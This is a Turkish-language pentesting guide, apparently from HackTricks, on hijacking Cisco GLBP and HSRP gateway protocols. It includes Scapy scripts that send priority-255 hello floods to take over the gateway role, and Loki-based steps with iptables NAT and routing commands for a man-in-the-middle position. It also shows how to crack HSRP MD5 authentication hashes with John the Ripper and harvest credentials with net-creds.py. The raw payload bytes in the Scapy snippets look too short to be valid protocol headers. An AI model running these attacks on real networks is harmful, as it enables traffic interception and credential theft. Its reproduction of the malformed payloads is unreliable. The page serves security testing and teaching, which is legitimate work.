# GLBP & HSRP Saldırıları

{{#include ../../banners/hacktricks-training.md}}


## FHRP Ele Geçirme Genel Bakış

### FHRP'ye Dair Bilgiler

FHRP, birden fazla yönlendiriciyi tek bir sanal birimde birleştirerek ağ dayanıklılığını sağlamak, yük dağılımını ve hata toleransını artırmak için tasarlanmıştır. Cisco Systems bu paket içinde GLBP ve HSRP gibi öne çıkan protokolleri sunmuştur.

### GLBP Protokolüne Dair Bilgiler

Cisco tarafından geliştirilen GLBP, TCP/IP yığını üzerinde çalışır ve iletişim için UDP port 3222'yi kullanır. Bir GLBP grubundaki yönlendiriciler 3 saniyelik aralıklarla "hello" paketleri değiş tokuş eder. Bir yönlendirici bu paketleri 10 saniye boyunca göndermezse çevrimdışı kabul edilir. Ancak bu zamanlayıcılar sabit değildir ve değiştirilebilir.

IPv6 için GLBP, UDP/3222 üzerinden multicast **FF02::66** kullanır ve sanal MAC formatı `0007.b4xx.xxyy` olur (AVF ID son bayttadır). Zamanlama ve saldırı yüzeyi IPv4 ile aynı kaldığından, hijack techniques dual‑stack ağlarda da çalışır.

### GLBP İşleyişi ve Yük Dağılımı

GLBP, tek bir sanal IP ile birden çok sanal MAC adresi kullanarak yönlendiriciler arasında yük dağılımına izin vererek öne çıkar. Bir GLBP grubunda her yönlendirici paket iletimine katılır. HSRP/VRRP'den farklı olarak, GLBP aşağıdaki mekanizmalarla gerçek yük dengeleme sunar:

- **Host-Dependent Load Balancing:** Bir host için atanmış AVF MAC adresinin tutarlılığını korur, stabil NAT yapılandırmaları için önemlidir.
- **Round-Robin Load Balancing:** Varsayılan yöntemdir; istek yapan hostlar arasında AVF MAC adresini sırayla atar.
- **Weighted Round-Robin Load Balancing:** Önceden tanımlanmış "Weight" metriklerine göre yük dağılımı yapar.

### GLBP'deki Temel Bileşenler ve Terimler

- **AVG (Active Virtual Gateway):** Ana yönlendirici, peer yönlendiricilere MAC adresleri tahsis etmekten sorumludur.
- **AVF (Active Virtual Forwarder):** Ağa trafik yönlendirmekle görevli yönlendirici.
- **GLBP Priority:** AVG'yi belirleyen metrik; varsayılan 100 olup 1 ile 255 arasında değişir.
- **GLBP Weight:** Bir yönlendiricinin mevcut yükünü yansıtır; elle veya Object Tracking ile ayarlanabilir.
- **GLBP Virtual IP Address:** Ağdaki tüm bağlı cihazlar için varsayılan gateway olarak hizmet eder.

Etkileşimler için GLBP, ayrılmış multicast adresi 224.0.0.102 ve UDP port 3222'yi kullanır. Yönlendiriciler 3 saniyelik aralıklarla "hello" paketleri gönderir; bir paket 10 saniye içinde alınmazsa yönlendirici çalışmıyor kabul edilir.

### GLBP Saldırı Mekanizması

Bir saldırgan en yüksek priority değeri (255) ile bir GLBP paketi göndererek birincil yönlendirici olabilir. Bu durum DoS veya MITM saldırılarına yol açabilir; trafiğin yakalanmasına veya yönlendirilmesine imkan verir.

**Pratik GLBP hijack with Scapy (short PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
GLBP header'ını (version/opcode/priority/weight/VRID) taklit etmek için payload baytlarını oluşturun. Frame'i loop'lamak, authentication yoksa AVG election'ını kazanmanızı sağlar.

### Loki ile GLBP Attack'ını Gerçekleştirme

[Loki](https://github.com/raizo62/loki_on_kali) priority ve weight'i 255 olarak ayarlayan bir packet enjekte ederek GLBP attack gerçekleştirebilir. Ön-attack adımları, virtual IP address, authentication presence ve router priority values gibi bilgileri Wireshark gibi araçlarla toplamayı içerir.

Attack Steps:

1. Promiscuous mode'a geçin ve IP forwarding'i etkinleştirin.
2. Hedef router'ı belirleyin ve IP'sini alın.
3. Gratuitous ARP oluşturun.
4. Kötü amaçlı bir GLBP packet enjekte edin, AVG'yi taklit edin.
5. Saldırganın network interface'ine GLBP virtual IP ile eşleşen ikincil bir IP adresi atayın.
6. Tam trafik görünürlüğü için SNAT uygulayın.
7. Orijinal AVG router aracılığıyla sürekli internet erişimini sağlamak için routing'i ayarlayın.

Bu adımları izleyerek saldırgan kendisini bir "man in the middle" konumuna getirir; unencrypted veya sensitive data da dahil olmak üzere network traffic'i intercept ve analyze edebilir.

For demonstration, here are the required command snippets:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Trafiği izleme ve yakalama, net-creds.py veya benzeri araçlarla, ele geçirilmiş ağ üzerinden akan verileri yakalayıp analiz etmek için yapılabilir.

### Komut Detaylarıyla HSRP Hijacking'in Pasif Açıklaması

#### HSRP Genel Bakış (Hot Standby Router/Redundancy Protocol)

HSRP, ağ geçidi yedekliliği için tasarlanmış Cisco'ya ait bir protokoldür. Birden fazla fiziksel yönlendiricinin paylaşılan bir IP adresine sahip tek bir mantıksal birim olarak yapılandırılmasına olanak tanır. Bu mantıksal birim, trafiği yönlendirmekten sorumlu birincil bir yönlendirici tarafından yönetilir. Yük dengeleme için priority ve weight gibi metrikleri kullanan GLBP'nin aksine, HSRP trafik yönetimi için tek bir aktif yönlendiriciye dayanır.

HSRPv1 multicast **224.0.0.2** ve sanal MAC `0000.0c07.acXX` kullanır; HSRPv2 ve IPv6 için HSRPv2 **224.0.0.102 / FF02::66** ve sanal MAC `0000.0c9f.fXXX` kullanır. UDP hedef portu IPv4 için **1985**, IPv6 için **2029**'dur.

#### HSRP'deki Roller ve Terminoloji

- **HSRP Active Router**: Geçit görevi gören ve trafik akışını yöneten cihaz.
- **HSRP Standby Router**: Aktif yönlendirici başarısız olursa devralmaya hazır yedek yönlendirici.
- **HSRP Group**: Tek bir dayanıklı sanal yönlendirici oluşturmak için işbirliği yapan yönlendiriciler kümesi.
- **HSRP MAC Address**: HSRP kurulumundaki mantıksal yönlendiriciye atanmış sanal MAC adresi.
- **HSRP Virtual IP Address**: HSRP grubunun sanal IP adresi; bağlı cihazlar için varsayılan ağ geçidi olarak davranır.

#### HSRP Sürümleri

HSRP iki sürümde gelir: HSRPv1 ve HSRPv2. Aralarındaki farklar ağırlıklı olarak grup kapasitesi, multicast IP kullanımı ve sanal MAC adresi yapısındadır. Protokol, servis bilgisi alışverişi için belirli multicast IP adreslerini kullanır; Hello paketleri her 3 saniyede bir gönderilir. Bir yönlendiriciden 10 saniye içinde paket alınmazsa o yönlendirici inaktif kabul edilir.

#### HSRP Saldırı Mekanizması

HSRP saldırıları, maksimum priority değeri enjekte ederek Active Router rolünü zorla devralmayı içerir. Bu, bir Man-In-The-Middle (MITM) saldırısına yol açabilir. Saldırı öncesi gerekli adımlar arasında HSRP yapısına dair veri toplamak bulunur; bu, trafik analizi için Wireshark kullanılarak yapılabilir.

**Quick HSRP takeover with Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
Kimlik doğrulama yapılandırılmamışsa, daha yüksek öncelikli helloları sürekli göndererek eşleri *Speak*/*Listen* durumlarına zorlayabilir ve *Active* rolünü üstlenmenize izin vererek trafiği hostunuz üzerinden yönlendirebilirsiniz.

**HSRP kimlik doğrulama istisnaları**

- Eski düz metin (plain-text) kimlik doğrulaması kolayca taklit edilebilir.
- MD5 kimlik doğrulaması yalnızca HSRP yükünü kapsar; özel hazırlanmış paketler kontrol düzlemlerine hâlâ rate-limit/DoS uygulayabilir. NX-OS sürümleri daha önce kimlik doğrulamalı gruplara karşı DoS'a izin veriyordu (bkz. Cisco advisory CSCup11309).
- Birçok ISP / VPS paylaşılan VLAN'ında HSRPv1 multicastleri tenantlar tarafından görülebilir; kimlik doğrulama yoksa katılabilir ve trafiği öne geçip ele geçirebilirsiniz.

#### HSRP Kimlik Doğrulamasını Atlatma Adımları

1. HSRP verilerini içeren ağ trafiğini .pcap dosyası olarak kaydedin.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. .pcap dosyasından MD5 hash'lerini hsrp2john.py kullanarak çıkarın.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. John the Ripper kullanarak MD5 hash'lerini kırın.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Loki ile HSRP Enjeksiyonunu Gerçekleştirme**

1. HSRP duyurularını tespit etmek için Loki'yi başlatın.
2. Ağ arayüzünü promiscuous moda alın ve IP forwarding'i etkinleştirin.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Belirli yönlendiriciyi hedeflemek, kırılmış HSRP parolasını girmek ve Active Router'ı taklit etmek için gerekli yapılandırmaları yapmak üzere Loki'yi kullanın.
4. Active Router rolünü elde ettikten sonra, meşru trafiği yakalamak için ağ arayüzünüzü ve IP tablolarınızı yapılandırın.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Yönlendirme tablosunu, trafiği eski Active Router üzerinden yönlendirecek şekilde değiştirin.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Yakalanan trafikten kimlik bilgilerini elde etmek için net-creds.py veya benzeri bir araç kullanın.
```shell
sudo python2 net-creds.py -i eth0
```

Bu adımları uygulamak, saldırganı trafiği yakalama ve manipüle etme pozisyonuna getirir; bu GLBP hijacking prosedürüne benzer. Bu durum, HSRP gibi yedeklilik protokollerindeki zafiyete ve sağlam güvenlik önlemlerinin gerekliliğine dikkat çeker.

## Referanslar

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
